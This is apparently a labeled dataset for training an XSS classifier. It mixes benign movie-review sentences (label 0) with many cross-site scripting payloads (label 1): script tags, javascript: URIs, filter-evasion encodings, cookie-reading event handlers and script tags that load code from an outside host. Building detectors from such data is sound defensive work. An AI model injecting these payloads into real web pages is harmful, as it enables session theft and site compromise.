label;sentence;1;;;;;;;;;;;;;;;;
1;"<IMG SRC=""javascript:alert('XSS');"">";;;;;;;;;;;;;;;;;
1;"<<script>alert(""xss"");//<</script>";;;;;;;;;;;;;;;;;
1;"<BODY ONLOAD!#$%&()*~+-_.,:;?@[/|\]^`=ALERT(""XSS"")>";;;;;;;;;;;;;;;;;
0;If it was to turn my good day feeling into a night of disturbing memories than I guess he succeeded.;;;;;;;;;;;;;;;;;
1;<IFRAME SRC=HTTP://HA.CKERS.ORG/SCRIPTLET.HTML <;;;;;;;;;;;;;;;;;
1;"<img src=""jav	ascript:alert('xss');"">";;;;;;;;;;;;;;;;;
0;No actress has been worse used that June Allison in this movie.;;;;;;;;;;;;;;;;;
0;When I saw it in the theater I thought I was going to be sick.;;;;;;;;;;;;;;;;;
1;<svg><script>alert(1)<p>;;;;;;;;;;;;;;;;;
0;Rating:  out of .;;;;;;;;;;;;;;;;;
0;Yet, I enjoy watching it.;;;;;;;;;;;;;;;;;
1;"';!--""<XSS>=&{()}";;;;;;;;;;;;;;;;;
0;Woa, talk about awful.;;;;;;;;;;;;;;;;;
0;And don't even get me started on the jerky camerawork.;;;;;;;;;;;;;;;;;
1;"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>";;;;;;;;;;;;;;;;;
1;"<img dynsrc=""javascript:alert('xss')"">";;;;;;;;;;;;;;;;;
1;&#39;;&#88;&#83;&#83;&#39;&#41;>;;;;;;;;;;
1;"\"";alert('XSS');//";;;;;;;;;;;;;;;;;
1;"</TITLE><SCRIPT>ALERT(""XSS"");</SCRIPT>";;;;;;;;;;;;;;;;;
1;#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>;;;;;;;;;;;;;;;;;
1;<SVG><scRipt>aLERT(1)<P>;;;;;;;;;;;;;;;;;
0;This would not even be good as a made for TV flick.;;;;;;;;;;;;;;;;;
1;"<iMg ONmOUseOVER=""aLeRt('XXS')"">";;;;;;;;;;;;;;;;;
1;"<img src=`jAvAscRiPt:aLERT(""RsNAkE says, 'XSS'"")`>";;;;;;;;;;;;;;;;;
0;The worst, sappiest dialogue... I could go on and on.;;;;;;;;;;;;;;;;;
0;This is a chilly, unremarkable movie about an author living/working in a chilly abstruse culture.;;;;;;;;;;;;;;;;;
1;<svg><script>alert(1)<p>;;;;;;;;;;;;;;;;;
1;"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>";;;;;;;;;;;;;;;;;
1;"<img src=""jav&#x0a;ascript:alert('xss');"">";;;;;;;;;;;;;;;;;
1;"<INPut tyPe=""IMagE"" SRC=""JaVasCRipt:alerT('xSS');"">";;;;;;;;;;;;;;;;;
0;It is an excellent drama, an excellent thriller, and an excellent film.;;;;;;;;;;;;;;;;;
1;<img src=javascript:alert(string.fromcharcode(88,83,83))>;;;;;;;;;;;;;;;;;
1;"<IMG DYNSRC=""javascript:alert('XSS')"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC=""JAVASCRIPT:ALERT('XSS');"">";;;;;;;;;;;;;;;;;
1;<svg><x><script>alert(1)</x>;;;;;;;;;;;;;;;;;
1;<a ONmOuseOvER=AlErt(DoCuMenT.COOKIE)>Xxs link</a>;;;;;;;;;;;;;;;;;
1;"<IMG SRC=""JAV&#X0D;ASCRIPT:ALERT('XSS');"">";;;;;;;;;;;;;;;;;
1;#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>;;;;;;;;;;;;;;;;;
0;His use of the colours of the French flag in the three films was nothing short of incredible, every shot, every scene was like a work of art.;;;;;;;;;;;;;;;;;
1;"<img src=""jav&#x0d;ascript:alert('xss');"">";;;;;;;;;;;;;;;;;
0;One of the best mexican movies ever!, and one of the less understood, even by mexican themselves, no matter how identified the should have felt with it.;;;;;;;;;;;;;;;;;
1;<SVG/ONLOAD=LOCATION=`JAVAS`+`CRIPT:ALE`+`RT%2`+`81%2`+`9`;;//;;;;;;;;;;;;;;;
1;<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>;;;;;;;;;;;;;;;;;
1;"<<scRiPT>aLerT(""xss"");//<</sCRipT>";;;;;;;;;;;;;;;;;
1;"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">";;;;;;;;;;;;;;;;;
1;<IMG SRC=JAVASCRIPT:ALERT(STRING.FROMCHARCODE(88,83,83))>;;;;;;;;;;;;;;;;;
1;"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>";;;;;;;;;;;;;;;;;
1;"<img lowsrc=""javascript:alert('xss')"">";;;;;;;;;;;;;;;;;
1;"<BODY BACKGROUND=""javascript:alert('XSS')"">";;;;;;;;;;;;;;;;;
1;<script src=//ha.ckers.org/.j>;;;;;;;;;;;;;;;;;
1;"<img """"""><script>alert(""xss"")</script>"">";;;;;;;;;;;;;;;;;
1;"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>";;;;;;;;;;;;;;;;;
1;"<IMG SRC=javascript:alert(""XSS"")>";;;;;;;;;;;;;;;;;
1;"<sTYlE>Li {LIsT-StYLE-IMAge: Url(""jaVAscRipT:ALErT('xss')"");}</styLe><UL><Li>xss</Br>";;;;;;;;;;;;;;;;;
0;I thoroughly enjoyed it when Christopher Eccleston took control of the TARDIS and the continuation of the series.;;;;;;;;;;;;;;;;;
0;It was forced, like everything in this movie.;;;;;;;;;;;;;;;;;
0;The cinematography-if it can be called that-sucked.;;;;;;;;;;;;;;;;;
1;"<imG SrC=/ oNERroR=""ALErT(StRINg.fROMcHARCodE(88,83,83))""></IMg>";;;;;;;;;;;;;;;;;
0;***SPOILERS*** Whatever else can (or can't) be said about it, SURFACE is superbly crafted.;;;;;;;;;;;;;;;;;
1;<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;;//;;;;;;;;;;;;;;;
0;BLACK WATER is a thriller that manages to completely transcend it's limitations (it's an indie flick) by continually subverting expectations to emerge as an intense experience.;;;;;;;;;;;;;;;;;
label;sentence;;;;;;;;;;;;;;;;;
0;Again, lame.;;;;;;;;;;;;;;;;;
1;<IMG SRC=&#X6A&#X61&#X76&#X61&#X73&#X63&#X72&#X69&#X70&#X74&#X3A&#X61&#X6C&#X65&#X72&#X74&#X28&#X27&#X58&#X53&#X53&#X27&#X29>;;;;;;;;;;;;;;;;;
1;"<IMG SRC=""JAV&#X0A;ASCRIPT:ALERT('XSS');"">";;;;;;;;;;;;;;;;;
1;"<A ONMOUSEOVER=""ALERT(DOCUMENT.COOKIE)"">XXS LINK</A>";;;;;;;;;;;;;;;;;
1;"<script/src=""http://ha.ckers.org/xss.js""></script>";;;;;;;;;;;;;;;;;
1;"<Img SRC=""jAV	AscRiPT:AlerT('xSs');"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC=`JAVASCRIPT:ALERT(""RSNAKE SAYS, 'XSS'"")`>";;;;;;;;;;;;;;;;;
1;"<iMg LOwSrc=""JaVaSCripT:alerT('Xss')"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC=""livescript:[code]"">";;;;;;;;;;;;;;;;;
0;Kieslowski never ceases to amaze me.;;;;;;;;;;;;;;;;;
1;"<script/xss src=""http://ha.ckers.org/xss.js""></script>";;;;;;;;;;;;;;;;;
1;<SCrIPT sRc=HttP://HA.ckeRS.ORG/xSS.js?< b >;;;;;;;;;;;;;;;;;
1;"<IMG SRC="" &#14;  javascript:alert('XSS');"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC='vbscript:msgbox(""XSS"")'>";;;;;;;;;;;;;;;;;
0;The plot simply rumbles on like a machine, desperately depending on the addition of new scenes.;;;;;;;;;;;;;;;;;
0;All things considered, a job very well done.;;;;;;;;;;;;;;;;;
1;"<BoDy bAckgroUNd=""jAvascript:AlErT('Xss')"">";;;;;;;;;;;;;;;;;
1;"<IMG SRc=""jaV&#X09;AsCrIPT:ALeRT('xsS');"">";;;;;;;;;;;;;;;;;
1;#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>;;;;;;;;;;;;;;;;;
1;"<IMG SRC="" &#14;  JAVASCRIPT:ALERT('XSS');"">";;;;;;;;;;;;;;;;;
1;<script src=http://ha.ckers.org/xss.js?< b >;;;;;;;;;;;;;;;;;
1;<SCRIPT SRC=//HA.CKERS.ORG/.J>;;;;;;;;;;;;;;;;;
1;"<a onmouseover=""alert(document.cookie)"">xxs link</a>";;;;;;;;;;;;;;;;;
1;<IMG SRC=&#106;;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40
0;Camerawork - again, bad.;;;;;;;;;;;;;;;;;
1;<imG SrC=jAvAsCRipT:aLeRT('xSS')>;;;;;;;;;;;;;;;;;
1;"<SCRIPT/SRC=""HTTP://HA.CKERS.ORG/XSS.JS""></SCRIPT>";;;;;;;;;;;;;;;;;
1;<sVG/onLoAD=lOCAtion=`JaVas`+`cRipt:AlE`+`rT%2`+`81%2`+`9`;;//;;;;;;;;;;;;;;;
1;<img src=javascript:alert('xss')>;;;;;;;;;;;;;;;;;
1;"<IMg SRc=""JaV&#X0A;asCRiPT:AleRt('xsS');"">";;;;;;;;;;;;;;;;;
1;"<BODY BACKGROUND=""JAVASCRIPT:ALERT('XSS')"">";;;;;;;;;;;;;;;;;
1;""" oNFOcus=""AlERT(1)"" Name=""BOUntY";;;;;;;;;;;;;;;;;
1;<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&;;;;;;;;;;;;;;;;;
1;"<<SCRIPT>ALERT(""XSS"");//<</SCRIPT>";;;;;;;;;;;;;;;;;
1;"<IMG SRC=""LIVESCRIPT:[CODE]"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC=""JAVASCRIPT:ALERT('XSS')""";;;;;;;;;;;;;;;;;
0;Regrettably, the film fails.;;;;;;;;;;;;;;;;;
1;"<IMG SRC=JAVASCRIPT:ALERT(""XSS"")>";;;;;;;;;;;;;;;;;
1;"<img src='vbscript:msgbox(""xss"")'>";;;;;;;;;;;;;;;;;
0;Mishima is extremely uninteresting.;;;;;;;;;;;;;;;;;
1;"<img src=# onmouseover=""alert('xxs')"">";;;;;;;;;;;;;;;;;
1;"<IMG SRC=# onmouseover=""alert('xxs')"">";;;;;;;;;;;;;;;;;
1;"<IMG DYNSRC=""JAVASCRIPT:ALERT('XSS')"">";;;;;;;;;;;;;;;;;
0;There is a lot of beautiful places.;;;;;;;;;;;;;;;;;
1;"<<SCRIPT>alert(""XSS"");//<</SCRIPT>";;;;;;;;;;;;;;;;;
0;That was nice.;;;;;;;;;;;;;;;;;
1;<script>alert(1)</script>;;;;;;;;;;;;;;;;;
0;The acting was bad.;;;;;;;;;;;;;;;;;
0;The poor actors.;;;;;;;;;;;;;;;;;
1;"</Title><ScRiPt>Alert(""xss"");</scRIPT>";;;;;;;;;;;;;;;;;
1;"<ScrIPT/src=""hTTp://ha.CkerS.OrG/xSS.Js""></sCRipT>";;;;;;;;;;;;;;;;;
0;Here's where the movie really pi**ed me off.;;;;;;;;;;;;;;;;;
1;"<ImG SrC="" &#14;  JAvasCRIPT:AlErT('Xss');"">";;;;;;;;;;;;;;;;;
1;<BODY ONLOAD=ALERT('XSS')>;;;;;;;;;;;;;;;;;
0;It was just too horrible.;;;;;;;;;;;;;;;;;
1;<script>alert(1)</script>;;;;;;;;;;;;;;;;;
1;<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&;;;;;;;;;;;;;;;;;
0;The character developments also lacked in depth.;;;;;;;;;;;;;;;;;
0;Three of the most visually appealing movies i've ever seen.;;;;;;;;;;;;;;;;;
1;<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;;;;;;;;;;;;;;;;;
0;I came out of it feeling angry.;;;;;;;;;;;;;;;;;
0;But this movie is not funny, considering the ridiculousness of it.;;;;;;;;;;;;;;;;;
1;<sCrIPT sRC=//hA.ckeRs.ORG/.J>;;;;;;;;;;;;;;;;;
0;the story which was told so eloquently by Francis ford Coppola 25 years earlier, really unfolds gradually and leaves room for the characters to develop.;;;;;;;;;;;;;;;;;
0;An AMAZING finale to possibly the BEST trilogy of all time!;;;;;;;;;;;;;;;;;
1;"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss</br>";;;;;;;;;;;;;;;;;
1;"<ScRiPT/XSS Src=""HtTP://HA.cKERS.Org/Xss.JS""></sCripT>";;;;;;;;;;;;;;;;;
1;&#39;;&#88;&#83;&#83;&#39;&#41;>;;;;;;;;;;
1;<BodY OnlOAD=alERT('XSS')>;;;;;;;;;;;;;;;;;
1;<iframe src=http://ha.ckers.org/scriptlet.html <;;;;;;;;;;;;;;;;;
1;"<iMG SrC=""jav&#x0d;asCRIpt:aleRT('xss');"">";;;;;;;;;;;;;;;;;
0;It ranks highly as a great noir-crime-drama, incredible performances by Belmondo and Lino Ventura.;;;;;;;;;;;;;;;;;
0;I mean, in a realistic world, she would NEVER have gotten into that ballet repertory... The whole thing was quite pathetic.;;;;;;;;;;;;;;;;;
1;"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">";;;;;;;;;;;;;;;;;
1;#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>;;;;;;;;;;;;;;;;;
1;<IMG SRC=JaVaScRiPt:alert('XSS')>;;;;;;;;;;;;;;;;;
0;I literally vomited while watching this film.;;;;;;;;;;;;;;;;;
0;Secondly, Hitchcock pretty much perfected the thriller and chase movie.;;;;;;;;;;;;;;;;;
1;<img src=&#x6a&#x61&#X76&#x61&#X73&#X63&#x72&#x69&#X70&#x74&#X3A&#X61&#X6c&#X65&#X72&#X74&#x28&#X27&#X58&#X53&#X53&#X27&#X29>;;;;;;;;;;;;;;;;;
1;"<A ONMouSEovEr=""ALERt(DOCuMENT.COOkIe)"">xxS linK</a>";;;;;;;;;;;;;;;;;
1;"<img src=""jav&#x09;ascript:alert('xss');"">";;;;;;;;;;;;;;;;;
0; out of  for both the movie and trilogy.;;;;;;;;;;;;;;;;;
1;<IMG SRC=JAVASCRIPT:ALERT('XSS')>;;;;;;;;;;;;;;;;;
1;"<img src=""javascript:alert('xss')""";;;;;;;;;;;;;;;;;
1;""" onfocus=""alert(1)"" name=""bounty";;;;;;;;;;;;;;;;;
1;"\"";alerT('xSS');//";;;;;;;;;;;;;;;;;
0;He is one of my favourite directors, and one of the most talented directors in the history of cinema.;;;;;;;;;;;;;;;;;
1;"';!--""<xss>=&{()}";;;;;;;;;;;;;;;;;
1;<SVG><X><SCRIPT>ALERT(1)</X>;;;;;;;;;;;;;;;;;
